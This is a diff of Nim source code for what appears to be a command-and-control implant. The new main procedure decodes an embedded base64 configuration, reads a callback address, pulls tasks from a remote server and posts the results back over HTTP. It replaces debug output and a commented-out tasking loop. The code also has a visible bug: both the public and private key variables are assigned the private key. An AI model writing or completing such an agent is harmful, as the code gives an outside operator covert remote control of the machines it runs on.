@@ -28,15 +28,18 @@ proc postResult(agent: StaticConfig, taskResult: string): string =
   )
   result = fetch(req).body
 
-echo LOOKUP_TABLE
-let ub64Str = unb64str(LOOKUP_TABLE)
-let test = ub64Str.fromFlatty(EncConfig)
-let testRead = readEncConfig(test)
-echo testRead.callback
+proc main() =
+  let ub64Str = unb64str(LOOKUP_TABLE)
+  let encConfig = ub64Str.fromFlatty(EncConfig)
+  let context = readEncConfig(encConfig)
+  
+  let pubKey = encConfig.privKey
+  let privKey = encConfig.privKey
+  echo context.callback
+  let tasks = getTasks(context)
+  echo tasks
+  let result = postResult(context, tasks)
+  echo result
 
-
-#the tasking loop
-# while true:
-#   echo getTasks(agent)
-#   echo postResult(agent,"my result")
-#   sleep(agent.interval)
+when isMainModule:
+  main()
